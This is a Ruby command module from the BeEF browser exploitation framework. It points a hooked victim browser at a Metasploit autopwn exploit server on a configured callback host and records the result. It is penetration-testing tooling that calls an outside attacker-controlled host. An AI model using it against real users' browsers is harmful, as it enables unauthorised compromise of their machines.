#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - https://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Browser_autopwn < BeEF::Core::Command
  def self.options
    @conf = BeEF::Core::Configuration.instance
    @uri = 'Enter AutoPwn URL Here'

    if @conf.get('beef.extension.metasploit.enable')
      host = @conf.get('beef.extension.metasploit.callback_host')
      url = @conf.get('beef.extension.metasploit.autopwn_url')
      @uri = "http://#{host}:8080/#{url}"
    end

    [
      { 'name' => 'sploit_url', 'description' => 'The URL to exploit', 'ui_label' => 'Listener URL', 'value' => @uri, 'width' => '200px' }
    ]
  end

  # This method is being called when a hooked browser sends some
  # data back to the framework.
  #
  def post_execute
    save({ 'result' => @datastore['result'] })
  end
end
